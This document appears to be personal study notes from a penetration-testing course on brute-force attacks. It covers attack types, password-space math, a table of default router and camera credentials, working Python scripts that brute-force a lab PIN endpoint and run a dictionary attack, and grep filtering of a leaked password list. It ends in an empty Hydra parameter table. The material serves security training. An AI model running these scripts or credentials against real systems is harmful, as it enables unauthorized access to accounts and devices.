# Introduction
Keys and passwords, the modern equivalent of locks and combinations, secure the digital world. But what if someone tries every possible combination until they find the one that opens the door? That, in essence, is `brute forcing`.
## What exactly is Brute Forcing?
In cybersecurity, brute forcing is a **trial-and-error** method used to **crack passwords, login credentials, or encryption keys**. It involves systematically trying every possible combination of characters until the correct one is found. The process can be likened to a thief trying every key on a giant keyring until they find the one that unlocks the treasure chest.

**The success of a brute force attack depends on several factors, including:**
- The `complexity` of the password or key. Longer passwords with a mix of uppercase and lowercase letters, numbers, and symbols are **exponentially** more complex to crack.

- The `computational power` available to the attacker. Modern computers and specialized hardware can try **billions** of combinations per second, significantly reducing the time needed for a successful attack.

- The `security measures` in place. **Account lockouts**, **CAPTCHAs**, and **other defences** can slow down or even thwart brute-force attempts.
## How Brute Forcing Works
The brute force process can be visualized as follows:
![[Pasted image 20241216205315.png]]
1. `Start`: The attacker initiates the brute force process.
2. `Generate Possible Combination`: The software generates a potential password or key combination based on predefined parameters, **such as character sets and length**.
3. `Apply Combination`: The generated combination is attempted against the target system, such as a **login form** or **encrypted file**.
4. `Check if Successful`: The system evaluates the attempted combination. If it matches the stored password or key, access is granted. Otherwise, the process continues.
5. `Access Granted`: The attacker gains unauthorized access to the system or data.
6. `End`: The process repeats, generating and testing new combinations until either the correct one is found or the attacker gives up.
## Types of Brute Forcing

Brute forcing is not a monolithic entity but a **collection of diverse techniques**, each with its strengths, weaknesses, and ideal use cases. Understanding these variations is crucial for both attackers and defenders, as it enables the former to choose the most effective approach and the latter to implement targeted countermeasures.
The following table provides a comparative overview of various brute-forcing methods:
t

| Method                  | Desc.                                                                                                                                   | Example                                                                                                                                                  | Best Used When..                                                                                                                                        |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Simple Brute Force      | Systematically tries all possible combinations of characters within a defined character set and range.                                  | Trying all combinations of lowercase letters from `a` to `z` for passwords of length `4` to `6`.                                                         | **No prior information** about the password is available, and computational resources are abundant.                                                     |
| Dictionary Attack       | Uses a pre-compiled list of common words, phrases, and passwords.                                                                       | Trying passwords from a list like `rockyou.txt` against a login form.                                                                                    | The target will likely use a **weak** or **easily guessable** password based on common patterns.                                                        |
| Hybrid Attack           | Combines elements of simple brute force and dictionary attacks, often with appending and prepending characters to the dictionary words. | **Adding** **numbers** or **special characters** to the **end** of words **from** a **dictionary** list.                                                 | The target might use a slightly modified version of a common password.                                                                                  |
| Credential Stuffing     | Utilizes leaked credentials from one service to attempt access to other services, assuming users reuse passwords.                       | Using a list of usernames and passwords **leaked** from a data breach to try logging into various online accounts.                                       | **A large set of leaked credentials is available**, and the target is suspected of **reusing passwords** across multiple services.                      |
| Password Spraying       | Attempts a small set of commonly used passwords against a large number of usernames.                                                    | Trying passwords like `password123` or `qwerty` **against all usernames in an organization**.                                                            | **Account lockout policies** are in place, and the attacker aims to **avoid detection** by spreading attempts across multiple accounts.                 |
| Rainbow Table Attack    | Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly.                                  | Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches. | A large number of password hashes need to be cracked, and storage space for the rainbow tables is available.                                            |
| Reverse Brute Force     | Targets a single password against multiple usernames, often used in conjunction with credential stuffing attacks.                       | Using a **leaked password** from one service to try logging into **multiple accounts** with different **usernames**.                                     | A strong suspicion exists that a particular password is being **reused** across multiple accounts.                                                      |
| Distributed Brute Force | Distributes the brute forcing workload across multiple devices to accelerate the process.                                               | Using a cluster of computers to perform a **brute-force** attack to significantly increase the number of combinations that can be tried per second.      | The target password or key is **highly complex**, and a single machine **lacks** the **computational power** to crack it within a reasonable timeframe. |
### The Role of Brute Forcing in Penetration Testing
While penetration tests encompass a range of techniques, brute forcing is often strategically employed when:
- **Other avenues are exhausted**: Initial attempts to gain access, such as exploiting known vulnerabilities or utilizing social engineering tactics, may prove unsuccessful. In such scenarios, brute forcing is a viable alternative to overcome password barriers.
- **Password policies are weak**: If the target system employs lax password policies, it increases the likelihood of users having weak or easily guessable passwords. Brute forcing can effectively expose these vulnerabilities.
- **Specific accounts are targeted**: In some instances, penetration testers may focus on compromising specific user accounts, such as those with elevated privileges. Brute forcing can be tailored to target these accounts directly.
## Password Security Fundamentals
Passwords are the first line of defence in protecting sensitive information and systems. A strong password is a formidable barrier, making it significantly harder for attackers to gain unauthorized access.
### Common Password Weaknesses
- **Short Passwords:** Passwords with fewer than **eight** characters are particularly vulnerable to brute-force attacks, as the number of possible combinations is relatively small.
- **Common Words and Phrases:** Using dictionary words, names, or common phrases as passwords makes them susceptible to dictionary attacks.
- **Personal Information:** Incorporating personal information like **birthdates**, **pet names**, or **addresses** into passwords makes them easier to guess, especially if this information is publicly available on social media or other online platforms.
- **Reusing Passwords:** Using the same password across multiple accounts is risky. If one account is compromised, all other accounts using the same password are also at risk.
- **Predictable Patterns:** Using patterns like "**qwerty**" or "**123456**" or simple substitutions like "**p@ssw0rd**" makes passwords easy to guess.
### Password Policies
Organizations often implement password policies to enforce the use of strong passwords. These policies typically include requirements for:
- **Minimum Length**: The minimum number of characters a password must have.
- **Complexity:** The types of characters that must be included in a password (e.g., **uppercase, lowercase, numbers, symbols**).
- **Password Expiration:** The frequency where you have to change passwords periodically.
- **Password History:** Previous passwords cannot be reused.
### The Perils of Default Credentials
Often overlooked is the danger posed by **default passwords**. They are often simple and easily guessable, making them a prime target for attackers.

The prevalence of default passwords makes them **low-hanging fruit** for attackers. They provide an easy entry point into systems and networks, potentially leading to data breaches, unauthorized access, and other malicious activities. **Below are examples of certain default passwords:**
![[Pasted image 20241216232427.png]]
**Or in a table format**

| <font color=" #8a5cf5">**Device/Manufacturer**</font> | <font color="#29dd01">Default Username</font> | <font color="#29dd01">Default Password </font> | <font color="#8a5cf5">Device Type </font> |
| ----------------------------------------------------- | --------------------------------------------- | ---------------------------------------------- | ----------------------------------------- |
| **Linksys Router**                                    | **admin**                                     | **admin**                                      | **Router**                                |
| **D-Link Router**                                     | **admin**                                     | **admin**                                      | **Router**                                |
| **Netgear Router**                                    | **admin**                                     | **password**                                   | **Router**                                |
| **TP-Link Router**                                    | **admin**                                     | **admin**                                      | **Router**                                |
| **Cisco Router**                                      | **admin**                                     | **cisco**                                      | **Router**                                |
| **Asus Router**                                       | **admin**                                     | **admin**                                      | **Router**                                |
| **Belkin Router**                                     | **admin**                                     | **password**                                   | **Router**                                |
| **Zyxel Router**                                      | **admin**                                     | **1234**                                       | **Router**                                |
| **Samsung SmartCam**                                  | **admin**                                     | **4321**                                       | **IP Camera**                             |
| **Hikvision DVR**                                     | **admin**                                     | **12345**                                      | **Digital Video Recorder (DVR)**          |
| **Axis IP Camera**                                    | **root**                                      | **pass**                                       | **IP Camera**                             |
| **Ubiquiti UniFi AP**                                 | **ubnt**                                      | **ubnt**                                       | **Wireless Access Point (WAP)**           |
| **Canon Printer**                                     | **admin**                                     | **admin**                                      | **Network Printer**                       |
| **Honeywell Thermostat**                              | **admin**                                     | **1234**                                       | **Smart Thermostat**                      |
| **Panasonic DVR**                                     | **admin**                                     | **12345**                                      | **Digital Video Recorder (DVR)**          |
To truly grasp the challenge of brute forcing, it's essential **to understand the underlying mathematics**. The following formula determines the **total number of possible combinations for a password:**
```mathML
Possible Combinations = Character Set Size^Password Length
```
For example, a **6-character password** using only lowercase letters (character set size of 26) has 26^6 (approximately 300 million) possible combinations. In contrast, an 8-character password with the same character set has 26^8 (approximately 200 billion) combinations. Adding uppercase letters, numbers, and symbols to the character set further expands the search space exponentially.

This exponential growth in the number of combinations highlights the importance of password length and complexity. Even a small increase in length or the inclusion of additional character types can dramatically increase the time and resources required for a successful brute-force attack.

Let's consider a few scenarios to illustrate the impact of password length and character set on the search space:

|                             | Password Length | Character Set                                         | Possible Combinations               |
| --------------------------- | --------------- | ----------------------------------------------------- | ----------------------------------- |
| **Short and Simple**        | 6               | Lowercase letters (a-z)                               | 26^6 = 308,915,776                  |
| **Longer but Still Simple** | 8               | Lowercase letters (a-z)                               | 26^8 = 208,827,064,576              |
| **Adding Complexity**       | 8               | Lowercase and uppercase letters (a-z, A-Z)            | 52^8 = 53,459,728,531,456           |
| **Maximum Complexity**      | 12              | Lowercase and uppercase letters, numbers, and symbols | 94^12 = 475,920,493,781,698,549,504 |
While a complex password can take **years** to brute-force with a single machine, a sophisticated attacker using a distributed network of high-performance computing resources could reduce that time drastically:
![[Pasted image 20241216233948.png]]
Comparing the basic computer and the supercomputer:
- **Basic Computer (1 million passwords/second)**: Good for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.
- **Supercomputer (1 trillion passwords/second)**: Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about **15000** years to crack.
# Brute Force Attacks
##  Cracking the PIN
The example application generates a random **4-digit PIN** and exposes an endpoint (`/pin`) that accepts a **PIN** as a query parameter. If the provided **PIN** matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.

We will use this simple demonstration **Python** script to brute-force the `/pin` endpoint on the **API**.

Copy and paste this Python script below as `pin-solver.py` onto your machine. You only need to modify the **IP** and **port** variables to match your target system information:
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```
The Python script systematically iterates **all possible 4-digit PINs (0000 to 9999)** and sends **GET** requests to the Flask endpoint with each **PIN**. It checks the response status code and content to identify the correct **PIN** and capture the associated flag:
```bash
$ python pin-solver.py
- - - -
...SNIP...
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```
## Dictionary Attack
The example application creates a route (`/dictionary`) that handles **POST** requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. 

If there's a match, it responds with a **JSON** object containing a success message and the flag. Otherwise, it returns an error message with a **401** status code (**Unauthorized**).

Copy and paste this Python script below as `dictionary-solver.py` onto your machine. You only need to modify the **IP** and **port** variables to match your target system information:
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```bash
$ python3 dictionary-solver.py

...SNIP...
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```
The Python script orchestrates the dictionary attack. It performs the following steps:
1. **Downloads the Wordlist**: First, the script fetches a wordlist of **500 commonly used** (and therefore weak) passwords from **SecLists** using the `requests` library.

2. **Iterates and Submits Passwords:** It then iterates through each password in the downloaded wordlist. For each password, it sends a **POST** request to the Flask application's `/dictionary` endpoint, including the password in the request's form data.

3. **Analyses Responses:** The script checks the response status code after each request. If it's **200** (**OK**), it examines the response content further. If the response contains the "**flag**" key, it signifies a successful login. The script then prints the discovered password and the captured flag.

4. **Continues or Terminates:** If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.
## Hybrid Attacks Explained
Many organizations implement policies **requiring users to change their passwords periodically** to enhance security. However, these policies can inadvertently breed predictable password patterns.
![[Pasted image 20241217003428.png]]
### Hybrid Attacks in Action
Let's illustrate this. Consider an attacker targeting an organization known to enforce regular password changes.
![[Pasted image 20241217003522.png]]
The attacker begins by launching a dictionary attack, using a wordlist curated with common passwords, industry-specific terms, and potentially personal information related to the organization or its employees. **This phase attempts to quickly identify any low-hanging fruit - accounts protected by weak or easily guessable passwords.**

However, if the dictionary attack proves unsuccessful, the hybrid attack seamlessly transitions into a **brute-force mode**. Instead of randomly generating password combinations, it strategically modifies the words from the original wordlist, appending numbers, special characters, or even incrementing years, as in the "**Summer2023**" example.
### The Power of Hybrid Attacks
The effectiveness of hybrid attacks lies in their adaptability and efficiency. They leverage the strengths of both dictionary and brute-force techniques, maximizing the chances of cracking passwords, especially in scenarios where users fall into predictable patterns.

It's important to note that hybrid attacks **are not limited to the password change scenario described above**. They can be tailored to exploit any **observed** or **suspected** password patterns within a target organization. Let's consider a scenario where you have access to a common passwords wordlist, and you're targeting an organization with the following password policy:
- Minimum length: 8 characters
- Must include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number

To extract only the passwords that adhere to this policy, we can leverage `grep` paired with `regex`. We are going to use the [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) password list for this. First, download the wordlist like:
```bash
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
```

Next, we need to start matching that wordlist to the password policy:
```bash
$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```
This `grep` command targets the requirement of **a minimum password length of 8 characters**. The regular expression `^.{8,}$` acts as a filter, ensuring that only passwords containing **at least 8 characters** are passed through and saved in a temporary file named `darkweb2017-minlength.txt`.

Then let's match passwords with uppercase letters:
```bash
$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```
This `grep` command adheres the policy's demand for **at least one uppercase letter**. The regular expression `[A-Z]` ensures that any password lacking an uppercase letter is discarded.

Next, let's get passwords which have lowercase letters:
```bash
$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```
This `grep` command ensures compliance with the policy's requirement for **at least one lowercase letter**. The regular expression `[a-z]` serves as the filter, keeping only passwords that include at least one lowercase letter and storing them in `darkweb2017-lowercase.txt`.

And lastly, let's get all passwords containing at least one number:
```bash
$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```
This last `grep` adheres to the numerical requirement. The regular expression `[0-9]` acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in `darkweb2017-number.txt`.

Now to check the amount of words within the filtered password list:
```bash
$ wc -l darkweb2017-number.txt

89 darkweb2017-number.txt
```
Meticulously filtering the extensive **10,000-password list** against the password policy has dramatically narrowed down our potential passwords to **89**. A smaller, targeted list translates to a faster and more focused attack, increasing the likelihood of a successful breach.

## Credential Stuffing: Using Stolen Data for Unauthorized Access
Credential stuffing exploits the fact that many users reuse passwords across multiple online accounts.
![[Pasted image 20241217004539.png]]
It's a **multi-stage** process that begins with attackers **acquiring lists** of **compromised usernames and passwords**. These lists can stem from large-scale data breaches or be compiled through phishing scams and malware. Public wordlists like `rockyou` or those in `seclists` can also serve as a starting point.

Once armed with these credentials, attackers identify potential targets - online services likely used by the individuals whose information they possess. **Social media, email providers, online banking, and e-commerce sites** are prime targets due to the sensitive data they often hold.

The attack then shifts into an automated phase. Attackers use **tools** or **scripts** to systematically test the stolen credentials against the chosen targets, often mimicking normal user behaviour to avoid detection. This allows them to **rapidly** test vast numbers of credentials, increasing their chances of finding a match.

# Hydra
**Hydra** is a **fast network login cracker** that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including **web apps**, remote login services like **SSH** and **FTP**, and **even databases**.

Hydra's popular due to its:
- **Speed and Efficiency:** Hydra utilizes parallel connections to perform multiple login attempts simultaneously.
- **Flexibility:** Hydra supports many protocols and services, making it adaptable to various attack scenarios.
## Basic Usage
```bash
$ hydra [login_options] [password_options] [attack_options] [service_options]
```
Where:

| Parameter              | Explanation | Usage Example |
| ---------------------- | ----------- | ------------- |
| `-l LOGIN`or `-L FILE` |             |               |
| `-p PASS` or `-P FILE` |             |               |
| `-t TASKS`             |             |               |
| `-f`                   |             |               |
| `-s PORT`              |             |               |
| `-v` or `-V`           |             |               |
| `service://server`     |             |               |
| `/OPT`                 |             |               |
